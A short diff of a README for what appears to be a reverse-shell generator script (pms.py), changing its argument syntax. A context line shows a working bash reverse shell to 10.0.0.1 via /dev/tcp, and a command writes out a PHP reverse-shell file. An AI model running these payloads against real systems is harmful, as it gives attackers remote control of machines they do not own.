@@ -15,7 +15,7 @@ Arguments
 ```type```: **required**, reverse shell type , (eg. "bash")\
 ```-c --config```: *optional* , configuration file , ```<default> pms.conf```\
 ```-h --host```: *optional*, host IP address\
-```-p --port```: *optional* port number\
+```-p --port```: *optional* port number
 
 shell types : bash, perl, python, php (shell), ruby, nc, nc-2, java, php-rev (file)
 
@@ -28,5 +28,5 @@ bash -i >& /dev/tcp/10.0.0.1/1111 0>&1
 ```
 Get php reverse shell file
 ```sh
-$ python3 pms.py --type php-rev > shell.php
+$ python3 pms.py php-rev > shell.php
 ```
